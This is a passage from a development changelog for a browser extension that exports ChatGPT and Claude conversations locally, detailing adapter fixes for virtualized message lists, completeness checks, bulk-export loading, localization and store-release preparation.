routes, and the sidebar bulk track. Rendered-UI verification on the loaded extension needs a manual load-unpacked session and stays open as a `[VERIFY]` (2026-07-25) *[superseded later the same day — the load-unpacked premise was wrong and the verification is done; see the rendered-UI entry at the top of this section]*

- [done] Claude exports are now bounded at the **trailing** end. `buildMessages` proved completeness two ways — the collected `data-index` range must be contiguous, and it must start at 0 — and neither says anything about the far end: a walk that stopped short at the bottom yields `0…k`, which is contiguous, starts at zero, and exported as a plausible partial. That is the silent truncation AGENTS.md #4 exists to prevent, and it was the one hole the `data-index` oracle could not see. Claude declares the conversation's whole row count on every row (`div[role="article"][aria-setsize]`), so a shortfall against it is proof; extraction now fails loud, splitting the message the same two ways an interior gap already does — rows that rendered hold markup the adapter cannot read (report it), rows that never rendered were never reached (scroll and retry). The declared total is used as an oracle only — it deliberately does NOT end the walk. Ending once every declared position is filled was implemented, and review caught it as a P0 before merge: a position being *filled* is not a turn being *finished*. The bottom turn of a still-streaming response is captured as a fragment in the first round, then recycled out of the DOM as the walk moves up, after which no later round can grow it — so a completeness test (with or without a quiescence requirement, since "nothing grew" is equally true when the growing row is off-screen) passes at the TOP of the conversation and the walk never returns to the bottom. Measured on the test fake at 20 turns against a 250 px viewport: the early-exit version ended at round 17 exporting a 4-character fragment where the unmodified walk ran 32 rounds and exported the whole answer — with the full suite green, which is the part worth remembering. The walk therefore still runs both passes to their scroll ends, and two tests now pin that: one exports a recycled streaming turn in full, one asserts the round count is identical with and without a declared total. A real termination condition needs a stream-completion signal that has never been measured, so it is filed to `backlog.md` rather than guessed at (AGENTS.md #5). Earned by a live Playwright session against the logged-in page (AGENTS.md #5), recorded in `docs/live-dom-verification.md`, and deliberately measured before a line was written because the previous session had seen `aria-setsize` on exactly **one** row and said so. Four conversations (14, 16, 26, 56 rows) were walked end to end: all **112 rows carried it** — including the attachment-only row that has no `user-message` node at all — the value was **constant across each walk** (50–74 record rounds), and it always equalled `maxIndex + 1`. It counts **rows, not messages**, which two of the four proved by disagreeing with their turn-node counts (56 vs 58, 26 vs 27) — a distinction that matters because the adapter keys on rows. Twelve further conversations spanning 2…56 rows were spot-checked and all carried it; `aria-posinset − data-index` was 1 on all 112 rows. Two dynamic properties decided the implementation rather than being assumed: the total **tracks the live list** (2 → 4 across one exchange in a conversation created for the test), so the adapter reads the **smallest** total observed during a walk — a message landing mid-export raises the total, and reading the largest would fail an export over turns that did not exist when it started, while the smallest costs nothing in the case the check exists for, where a short walk sees the true total on every row it reaches; and a 100 ms-resolution hydration trace found **no low intermediate value** inside a conversation (rows go from zero `role="article"` elements straight to the full count), so nothing can latch the minimum onto a wrong reading. Where no total is declared at all — a markup change — the gate is skipped and behavior is exactly what it was, because a drifting attribute must not turn every export into a failure. Five new tests (424 → 429), every one verified to fail under a targeted neutralization: disabling the gate, reading the largest declared total instead of the smallest, firing the gate when nothing is declared, and — for the two walk-length tests — restoring the early-exit revision, which ends the walk past a recycled mid-stream turn. Incidentally re-measured on the way: `minIndex` was 0 in all four walks, so the 0-based rule `buildMessages` had generalized from a single conversation now rests on four — the stale n=1 note in that comment is corrected, though the `[VERIFY]` tracking it is left open for its own cycle. No new permissions, hosts, or network calls (2026-07-25)
- [done] Fix: a Claude conversation containing a file attachment could not be exported at all — an attachment-only user turn renders **no `[data-testid="user-message"]` node whatsoever** (the tiles sit in the virtualizer row beside the action bar), so the turn query matched nothing, the row's `data-index` was claimed by no turn, and `buildMessages` failed the whole conversation with "…could not read". Loud, per AGENTS.md #4, but a dead end: no retry ever cleared it. Such rows are now described as `[File: <name>]`, mirroring the ChatGPT adapter's attachment markers, with names read from each thumbnail's `alt` rather than from the tile's `data-testid` — Claude puts the file name in both, but a test id whose *value* is user data is not a contract. The recognizer is deliberately narrow: a turnless row is claimed only when it carries both attachment images and the **user-exclusive** `action-bar-edit` control, so anything else keeps the pre-existing loud failure instead of being guessed at. Also closed in the same pass: `buildMessages` asserted only that collected indices are *contiguous*, which cannot distinguish "turns 1…n" from "turns 0…n−1"; now that `data-index` is confirmed 0-based, a range starting above 0 is treated as a hole through the same rendered-vs-not branching, so it reports either "missing its first turns" or "could not read" rather than exporting a conversation with its opening silently absent. Three live measurements earned all of this (recorded in `docs/live-dom-verification.md`, and they disprove a claim the previous session's comments asserted as fact): on a 56-row conversation `data-index` ran 0…55 dense; turn nodes per row were **54 rows with one, one with four, one with none** — so "exactly one turn node per indexed row" was never true, it rested on a 50-turn conversation in which no row happened to hold more than one, for reasons that session never recorded; and partitioning every `data-testid` by role showed `action-bar-edit`/`user-message` user-exclusive, `action-bar-read-aloud`/`action-bar-retry` assistant-exclusive, `action-bar-copy` shared. Six new tests (418 → 424), each verified to fail under targeted neutralization of the code it covers. Three things are recorded but deliberately not acted on, each because the markup behind them was never captured: a **user turn holding both text and a file** still exports its text without reporting the file — the one place this adapter is not at parity with ChatGPT's `readTurn`, left alone because sweeping a claimed row for images would relabel a pasted image as a file; the `role="article"` wrapper's `aria-setsize`, whose value matched the row count and may be a stronger oracle than contiguity, but was seen on one row only (filed to `backlog.md`); and how artifact cards and tool calls render, since nothing established the measured conversation contained any. All three stay open as `[VERIFY]`s, as does a re-measurement of `minIndex`, since the new range-starts-at-0 rule generalizes from a single conversation. No new permissions, hosts, or network calls (2026-07-25)

- [done] Claude adapter (minimal v1) — the extension now mounts its export buttons on `claude.ai/chat/<id>` and writes the conversation to Markdown/PDF/JSON/HTML locally, the first provider added behind the `ConversationAdapter` seam. Scope is single-conversation only: `provider`/`matches`/`extract`/`toolbarMount`/`toolbarAnchor`/`toolbarButtonClass`. The bulk-sidebar and Projects tracks are deliberately left unimplemented rather than shipped unverified; `src/content/mount.ts` now gates the bulk icon on `listConversations` + `openConversation`, since the icon was previously gated on the user setting alone and would have rendered on every Claude chat only to answer a click with "not supported". Every selector was earned from three console snippets run against the live logged-in page (AGENTS.md #5), recorded in `docs/live-dom-verification.md` → Claude. The load-bearing finding: Claude's message list is a **recycling** virtualizer (16 turn nodes rendered at the bottom, 8 at the top, 50 distinct `data-index` values across the walk), so a one-shot `querySelectorAll` would have silently truncated ~68% of a 50-turn conversation (AGENTS.md #4) — `extract` instead walks the `[data-autoscroll-container]` viewport up then down and accumulates, keyed by the row's `data-index`. That index also buys a **completeness oracle** the ChatGPT adapter has never had: the indices of a fully-walked conversation are contiguous, so a hole fails loud instead of returning a plausible partial. Supporting changes: `html-to-markdown` moved from the ChatGPT adapter to `src/core/` so both providers share it without a cross-adapter import (AGENTS.md #3), gaining a `language-xxx` class reader (Claude tags the `<code>`; ChatGPT uses a header label) and a `blockToMarkdown` entry point for a list lifted straight out of a user turn; `src/content/page.ts` is now registry-driven rather than hardcoding ChatGPT. User turns are read as text per block, not through the serializer, because Claude renders them `whitespace-pre-wrap` and the typed newlines are content. New host permission `https://claude.ai/*` (one host per registered adapter); `permissions` unchanged at `["storage"]`; no network calls. Review (Claude ×2, Codex, Antigravity) changed the adapter in five further ways, four of them removing a silent- or dead-end-failure path: the walk upgraded a turn's content only from *empty*, so a response still streaming when the export began was pinned at its first fragment and exported truncated even though the walk later saw it complete (now keeps the fullest sighting); a second turn node inside one indexed row was discarded rather than joined; a gap in the index range always blamed the walk, even when the row had rendered and simply held markup the adapter cannot read (now two distinct errors, so "scroll and retry" is only suggested when retrying can help); a user turn holding only an image yielded empty content and failed the *whole* conversation (now `[Image]`, off the standard `<img>` tag — file-attachment tiles remain unverified and deliberately still fail loud); and the walk left the viewport at the bottom, losing the reader's place, now restored in a `finally` so a failed export does not cost it either. `TOOLBAR_BUTTON_CLASS` also had its `disabled:` variants restored: they were dropped as "variants that never apply", which was simply wrong — `runExport` disables every button for the duration, and on Claude that is a multi-second walk, making those tokens the only in-flight feedback. 43 new tests (406 → 418); every scroll/loop, truncation, and class guard was verified to fail under targeted neutralization (the first streaming test passed under the broken code — it keyed the partial render to scroll position rather than elapsed time — and was rewritten until it genuinely reproduced the truncation). Rendered-UI verification on the loaded extension is a manual load-unpacked session and is left open as a `tasks.md` `[VERIFY]` (2026-07-25) *[superseded later the same day — the load-unpacked premise was wrong and the verification is done; see the rendered-UI entry at the top of this section]*

- [done] Bulk panel "Load more" — live progress during the multi-minute load. Since the truncation fix the button is a genuinely long wait (measured `rounds(N) ≈ 0.271 N + 10` at 500 ms/round → ~2.5 min on a 1042-conversation account, up to ~17 min before the step cap fails loud), but the panel showed only a static disabled "Loading…" — no counter, no sign of life. The list loaders now take an optional `onProgress(loaded)` (`LoadMoreOptions`, and a loader-only `LoadMoreScrollOptions` in the ChatGPT adapter so `extract`'s message-viewport walk is untouched); `scrollUntilStable` fires it with the running cumulative conversation count, and only on rounds that surfaced genuinely new rows — never on a stall round, and the stateful `endOfListGate` is still consulted exactly once per round in the same order. The panel streams it into its existing status line ("Loading conversations… 340 so far" — worded to avoid a count-governed plural noun, since `chrome.i18n` has no plural forms and the count can be 1), clears the line on success, and leaves the fail-loud error path untouched. The progress writes reuse the existing `isBatchStarted()` guard, so an export batch that starts mid-load still owns the modal and its progress line is never clobbered. Cancel remains out of scope. Five new tests; the stall-round one requires every tick to report a strictly larger count (a stall-round tick repeats the previous one) and was verified to fail with the guard neutralized. No new permissions, hosts, or network calls (2026-07-25)

- [done] Fix: bulk-export "Load more" silently truncated long histories — `scrollUntilStable` judged the list "fully loaded" whenever the item count held flat for `stableRounds`, but `#history` pages in from the server at a measured **1418–2830 ms** per batch while the stall window was only `3 × 150 ms ≈ 450 ms`. On a 1042-conversation account the shipped algorithm returned **19 of 852** conversations and *returned normally* — no `ExtractionError` — so the panel offered 2% of the history as if it were the whole list (violating AGENTS.md #4). Two-part fix: (1) the list loaders now refuse to settle while the container still scrolls — `endOfListGate` reports "ended" only once `stepDown` stops moving `scrollTop`, so a landed page (or a run of item-less rows such as date dividers) resets the stall counter instead of ending the walk; it tests scroll *movement* rather than `scrollTop + clientHeight >= scrollHeight`, because `findScrollableAncestor` can resolve a port taller than the list itself (the project page's stage: `scrollH 730 > clientH 400`) whose arithmetic bottom a healthy walk would never reach. (2) The loaders carry their own tuning (`SIDEBAR_SCROLL_DEFAULTS`: 500 ms × 10 rounds = a 5 s dwell, ~1.6–1.8× the slowest measured round-trip; step cap 2000, sized from `rounds(N) ≈ 0.271 N + 10` so a healthy ~7300-conversation history completes instead of throwing) instead of inheriting the message viewport's numbers. ChatGPT exposes no verified "fetching" marker, so the residual dwell is time-based by necessity — no spinner selector was invented (AGENTS.md #5). The message-viewport path (`autoScrollToLoad`/`collectVirtualizedTurns`) is byte-identical. Cost: a healthy short list now takes ~4.5 s to settle instead of ~450 ms. Five new tests, each verified to fail under a targeted neutralization; the dwell margin is pinned by an arithmetic guard so it cannot be tuned back down unnoticed. Live findings behind these numbers recorded in `docs/live-dom-verification.md`. No new permissions, hosts, or network calls (2026-07-24)

- [done] Fix: bulk-export "Load more" drops rows under a recycling virtualizer — the panel previously scrolled the virtualized source and then did a *single* `listConversations` re-scan of the currently-rendered DOM, so under ChatGPT's windowed/recycling virtualizer (which keeps only a window of rows in the DOM) the final scan captured only the bottom window → the checklist stopped short and didn't match the real list. Two-part fix: (1) `loadMoreConversations`/`loadMoreProjectConversations` now **step one viewport per round** (`stepDown`) instead of jumping to `scrollHeight`, so every window is rendered in turn — a jump would skip the middle rows of a spacer-height virtualizer entirely; (2) each round's rows are accumulated into an ordered id-keyed `Map` *across* rounds and the full list is returned (return type `Promise<void>` → `Promise<SidebarConversation[]>`), so rows trimmed off the top are kept. `mount.ts` uses that list directly instead of a lossy post-scroll re-scan. Strictly more robust — non-recycling lists yield the identical deduped result. `collectConversations` now backs `listConversations`/`listProjectConversations` too (single extraction path). New `load-more.test.ts` models a true spacer-height recycling virtualizer and asserts every row (top, middle, bottom) survives. Resolves the recycling-virtualizer `tasks.md` `[VERIFY]`. No new permissions, hosts, or network calls (2026-07-22)
- [done] Bulk panel "Load more" trigger — the bulk-export selection panel now shows a "Load more" button that, in one click, scrolls the virtualized source (ChatGPT history sidebar / Project list) to the bottom until the rendered list stops growing, then appends the newly-revealed conversations to the checklist (existing selections preserved), removing the need to manually scroll the sidebar first. Provider-agnostic: the panel and `BulkTrack` gain a `loadMore` hook; all scroll/DOM knowledge lives in the ChatGPT adapter's new `loadMoreConversations`/`loadMoreProjectConversations`, which discover the scroll container generically (no hardcoded selector, AGENTS.md #5) and fail loud (`ExtractionError`) on a runaway that never settles. Wired for both the history and project tracks. Live scroll-container discovery deferred to a `tasks.md` `[VERIFY]` (needs a logged-in session). No new permissions, hosts, or network calls (2026-07-22)
- [done] Download on GPT & Project conversation pages — the single-conversation toolbar (MD/PDF/JSON/HTML) now mounts on custom-GPT and Project chat URLs (`/g/<gizmoId>/c/<convId>`, e.g. `/g/g-Acb5zqD3l-…/c/<id>`), not only plain `/c/<id>`. Fix is a one-regex widening of `CONVERSATION_PATH` in the ChatGPT adapter (`src/adapters/chatgpt/matches.ts`); extraction/toolbar/export were already URL-agnostic once the match gate passes. Project *home* pages (`/g/g-p-<id>/project`) stay `matchesProject`-only — no overlap. Build hygiene: ignore the untracked extracted release package (`prompt-vault-v*/`) in git + eslint. No new permissions, hosts, or network calls (2026-07-22)
- [done] Chrome Web Store submission prep finalized with three sanitized 1280×800 live screenshots, a required 440×280 promotional tile, a padded store icon, current privacy disclosures and Limited Use statement, live single/bulk export verification, and a validated MV3 `v1.1.2` upload package (2026-07-22)

## 1.1.1 (2026-07-18)

- [done] Project bulk-download trigger now blends with ChatGPT's chrome — the "Download all" button wears ChatGPT's own labeled secondary-button classes (`btn btn-secondary h-9 px-3`, a theme-aware bordered pill matching the Share button) instead of a foreign green pill; the class is provider-owned (`projectToolbarButtonClass` on the adapter) so the content layer stays provider-agnostic, and the overlay fallback keeps its self-styled pill for legibility without host CSS. Verified against the live logged-in site (2026-07-18)

## 1.1.0 (2026-07-18)

- [done] Project bulk download — a "Download all" trigger mounts on ChatGPT Project home pages (`/g/g-p-<id>/project`) and drives the existing provider-agnostic `bulkExport` core + selection panel to save every conversation in the project (MD/PDF/JSON/HTML). New adapter members (`matchesProject`, `listProjectConversations`, `openProjectConversation`, `openProjectHome`, `projectToolbarMount`) keep all ChatGPT DOM knowledge centralized; the list `<section>` scope excludes the persistent left-nav project expando. Navigation keys on the stable `/c/<convId>` id (project URLs carry a varying slug). No new permissions, hosts, or network calls; selectors verified against the live logged-in site (2026-07-18)

## 1.0.0 (2026-07-18)

First Chrome Web Store release.

- [done] Web Store submission prep — `npm run package` (`scripts/package.mjs`) builds and zips `dist/` into a versioned `prompt-vault-v<version>.zip` with the manifest at the zip root (uses the system `zip` CLI, no runtime dep); a local-only/no-collection privacy policy (`docs/PRIVACY.md`); and a full listing + submission guide (`docs/store-listing.md`: EN/KO descriptions, single-purpose statement, permission justifications, data-use disclosures, screenshot shot list, checklist). Runbook's package command filled in. Screenshots and the dashboard upload remain human-only (need a login session / developer account) (2026-07-18)

- [done] Toolbar icon opens settings — added an `action` to the manifest with `default_popup` pointing at the existing options page (`src/options/index.html`), so clicking the extension's toolbar icon opens the settings form as a popup. The same page still backs the `chrome://extensions` "Extension options" link, so there's one settings UI reachable two ways. No new permission (`action` needs none) (2026-07-18)

- [done] Toolbar format settings (options page) — a new `options_ui` settings page (`src/options/`) lets the user choose which header-toolbar icons appear: the four single-export format icons (MD/PDF/JSON/HTML) and the bulk icon, each a checkbox. Settings persist in `chrome.storage.sync` (new `storage` permission; `sanitize` fail-safes an all-off value back to all-on so the toolbar is never left export-less), apply live to open ChatGPT tabs via `chrome.storage.onChanged`, and default to all-on so an unconfigured install is unchanged. Content toolbar (`src/content/mount.ts`) filters its buttons by the loaded settings. No network calls (2026-07-17)

- [done] i18n message-key safety test — `test/i18n/message-keys.test.ts` asserts every key resolved through `m('...')` in `src/strings.ts` exists in both `public/_locales/{en,ko}/messages.json` with matching placeholder sets, turning a silent-empty-string key typo (AGENTS.md #4 fail-loud regression) into a red test. Test-only; no runtime change (2026-07-17)

- [done] i18n (Korean UI strings) — native `chrome.i18n` localization: message catalog in `public/_locales/{en,ko}/messages.json`, `src/strings.ts` now resolves every user-facing string via `chrome.i18n.getMessage()` (public API unchanged), `default_locale: 'en'` in the manifest; locale follows the browser UI language. A node-env vitest shim (`test/setup/chrome-i18n.ts`) backs the English catalog for tests. No new permissions or network calls (2026-07-17)

- [done] Additional export formats — JSON & HTML — two new provider-agnostic exporters (`src/export/json.ts`, `src/export/html.ts`) consuming the normalized `Conversation` model; JSON is a deterministic round-trippable model dump, HTML is a self-contained document showing each message's Markdown verbatim in an HTML-escaped `<pre>` block; wired into the headless saver (`ExportFormat` now `md|pdf|json|html`) and the header toolbar (four icon buttons). No new permissions or network calls (2026-07-17)

- [done] Bulk download — export core slice — headless `saveConversation(conversation, format, now, doc?)` and a provider-agnostic sequential `bulkExport` orchestrator (per-item fail-loud into a `{ total, succeeded, failed[] }` summary, throttled between saves); `runExport` now delegates its produce+save step to the shared saver. The design's "forward hook" for bulk export; live sidebar enumeration + navigation remain a deferred, login-session-only follow-up (2026-07-17)

- [done] Markdown export serialization edge-case fixes — `<div>`/`<section>` wrapper block children in `<li>` no longer flatten onto the marker line (and a wrapper whose first block child is a nested list no longer collides markers); emphasis/strikethrough delimiters straddling an inline wrapper (`_<span>x</span>_`) now escape via cross-boundary flanking classification, without over-escaping an intraword `_` next to inline markup (2026-07-17)

- [done] Blend download buttons into the ChatGPT header — the `MD`/`PDF` buttons now mount inside ChatGPT's native header action bar (styled like the Share button, auto light/dark) instead of a fixed overlay that covered Share; falls back to a non-overlapping bottom-right overlay if the header is absent (2026-07-17)

- [done] html-to-markdown serialization & escape fixes — block content in `<li>` (nested code/paragraphs/`<ol start>`/text-after-list), literal-backslash-first escaping, CommonMark-flanking emphasis/strikethrough escaping, and GFM `<table>` support (2026-07-17)

- [done] Fail-loud empty-conversation guard — `runExport` throws `ExtractionError` (visible alert, no download) on a zero-message `Conversation`, defense-in-depth over adapter-level guards for both MD and PDF paths (2026-07-17)

- [done] Markdown escaping — escape Markdown-significant characters in `html-to-markdown` text nodes and the `toMarkdown` title so literal text (`# not a heading`, `[1]`, `1.`) no longer round-trips into structure (2026-07-17)

- [done] PDF export — PDF button saves the conversation as a selectable-text PDF (embedded Jetendard CJK monospace font, direct download, no print dialog) (2026-07-17)

- [done] Markdown export — Download button saves the conversation as a local `.md` file (2026-07-17)

- [done] Core Conversation model & ChatGPT adapter (centralized selectors, auto-scroll, HTML→Markdown, fail-loud) with fixture tests (2026-07-17)
- [done] eslint type-checked lint (recommendedTypeChecked, projectService) (2026-07-17)
- [done] CodeQL code scanning (javascript-typescript, security-extended) on push/PR (2026-07-17)
- [done] Privacy invariant gate — no-external-network test over src/adapters|export|content (2026-07-17)
- [done] Scaffold & MV3 skeleton (2026-07-17)
